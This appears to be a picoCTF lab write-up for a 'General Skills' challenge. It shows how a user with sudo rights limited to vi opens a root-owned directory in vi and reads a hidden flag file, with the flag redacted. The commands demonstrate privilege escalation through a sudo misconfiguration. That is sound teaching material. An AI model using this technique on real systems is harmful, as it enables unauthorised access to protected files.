Category: [General Skills](../)

## Description ##
 
Can you read files in the root file?

## Thought process ##
We have to somehow access files in root.
Our user doesn't have permissions:
```bash
$ ls /root
ls: cannot open directory '/root': Permission denied
$ sudo ls /root
[sudo] password for picoplayer: 
Sorry, user picoplayer is not allowed to execute '/usr/bin/ls /root' as root on challenge.

```
We list our user's privelages:
```bash
$ sudo -l
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
```
The output of sudo -l shows that your user, picoplayer, has permission to run the /usr/bin/vi command with sudo. This means you can use sudo to open files with the vi text editor, which can be used to view and edit files.
We open vi editor from root:
```bash
$ sudo vi /root
```

```bash
" ============================================================================
" Netrw Directory Listing                                        (netrw v165)
"   /root
"   Sorted by      name
"   Sort sequence: [\/]$,\<core\%(\.\d\+\)\=\>,\.h$,\.c$,\.cpp$,\~\=\*$,*,\.o$,\
"   Quick Help: <F1>:help  -:go up dir  D:delete  R:rename  s:sort-by  x:special
" ==============================================================================
../                                                                             
./
.vim/
.bashrc
.flag.txt
.profile
.viminfo
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~       
```

## Solution
```bash
$ sudo vi /root/.flag.txt
```

```bash
picoCTF{.........}
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
"~/.flag.txt" 1L, 35C 
```
